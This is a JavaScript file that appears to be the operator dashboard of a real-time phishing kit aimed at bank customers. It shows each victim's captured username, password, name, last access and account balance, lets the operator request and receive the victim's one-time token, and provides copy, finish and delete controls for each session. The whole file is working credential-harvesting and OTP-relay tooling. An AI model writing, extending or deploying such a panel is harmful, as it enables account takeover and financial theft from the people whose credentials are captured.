const socket = io();

socket.on("connect", () => {
    console.log("El socket se ha conectado: ", socket.id);
    socket.emit("AdmOn", socket.id);
})

const panelData = document.querySelector("#panel-1");
var dataCollection = [];

socket.on("NewData", data => {
    var dataInfo = `<div class="row-data" id="parent-${data[0].socket}"> 
                        <div class="info-row" id="row-${data[0].socket}"> 
                            <p id="u-${data[0].socket}"> 
                                <b>User:</b> <span id="info-${data[0].user}">${data[0].user}</span>
                                <button class="token-copiar" id="button-${data[0].user}">
                                </button> 
                            </p>
                            <p id="p-${data[0].socket}">
                                <b>Pass:</b> <span id="info-${data[0].pass}">${data[0].pass}</span>
                                <button class="token-copiar" id="button-${data[0].pass}">
                                </button> 
                            </p>
                            <p id="n-${data[0].socket}"> <b>Nombre:</b> ${data[1]} </p>
                            <p id="a-${data[0].socket}"> <b>Ultima vez:</b> ${data[2].substring(14)} </p>
                            <p id="s-${data[0].socket}"> <b>Saldo:</b> ${data[3]} </p>
                        </div>
                        <div class="buttons-row">
                            <!--<button class="iniciar-sesion" id="l-${data[0].socket}">Probar data</button>-->
                            <button class="pedir-token" id="t-${data[0].socket}">Pedir token</button>
                            <button class="finalizar" id="f-${data[0].socket}">Finalizar</button>
                            <button class="eliminar" id="d-${data[0].socket}">Eliminar</button>
                        </div>
                    </div>`
    panelData.innerHTML += dataInfo;
    dataCollection.push(data);
    setTimeout(() => {
        socket.emit("EnviarInfoHomeConect", data);
    }, 2000);
})

//Get Token
socket.on("ReSendToken", dataToken => {
    if(document.querySelector("#row-"+dataToken.Socket)){
        var parentData = document.querySelector("#row-"+dataToken.Socket);
        document.querySelector("#token-load").remove();
        dataTokenInsert = `<p> 
                                <b>Token:</b> <span id="info-${dataToken.Token}">${dataToken.Token}</span>
                                <button class="token-copiar" id="button-${dataToken.Token}">
                                    
                                </button>
                            </p>`;
        parentData.innerHTML += dataTokenInsert;

        //document.querySelector("#t-"+dataToken.Socket).remove();
    }
})

//Disconnect queue
socket.on("DisconnectQueue", baySocket => {
    if(document.querySelector("#row-"+baySocket.Id)){
        document.querySelector("#t-"+baySocket.Id).remove();
        document.querySelector("#f-"+baySocket.Id).remove();
    }
})

//Buttons panel
const on = (element, event, selector, handler) => {
    element.addEventListener(event, e => {
        if (e.target.closest(selector)) {
            handler(e)
        }
    })
}

on(document, 'click', '.pedir-token', e =>{
    const id = e.target.id;
    idUser = id.substring(2);
    socket.emit("PedirToken", idUser);
    document.querySelector("#"+id).innerHTML = "Volver a pedir token";
    
    if(document.querySelector("#token-load")){
        document.querySelector("#token-load").remove();
    }
    
    const parentData = document.querySelector("#row-"+idUser);
    dataTokenInsert =   `<p id="token-load"> 
                            <b>Token:</b> 
                            <img src="/img/Spinner-macro-Azul-Rota.gif">
                        </p>`;
    parentData.innerHTML += dataTokenInsert;
})

on(document, 'click', '.token-copiar', e =>{
    const id = e.target.id;
    const token = id.substring(7);
    //const contentToken = document.querySelector("#info-"+token);
    //const text = contentToken.innerHTML;

    var codigoACopiar = document.getElementById("info-"+token);
    var seleccion = document.createRange();
    seleccion.selectNodeContents(codigoACopiar);
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(seleccion);
    var res = document.execCommand('copy');
    window.getSelection().removeRange(seleccion);

    //navigator.clipboard.writeText(text);
    document.querySelector('#'+id).classList.toggle('token-copiado');
    setTimeout(() => {
        document.querySelector('#'+id).classList.toggle('token-copiado');
    }, 1000);
})

on(document, 'click', '.finalizar', e =>{
    const id = e.target.id;
    idUser = id.substring(2);
    socket.emit("Finalizar", idUser);
    document.querySelector("#f-"+idUser).remove();
    document.querySelector("#t-"+idUser).remove();
})

on(document, 'click', '.eliminar', e =>{
    if(confirm('¿Deseas eliminar este registro?')){
        const id = e.target.id;
        idUser = id.substring(2);
        document.querySelector("#parent-"+idUser).remove();
    }
})


// RECARGAR LA PAGINA
window.onbeforeunload = function() {
    return "¿Desea recargar la página web?";
  };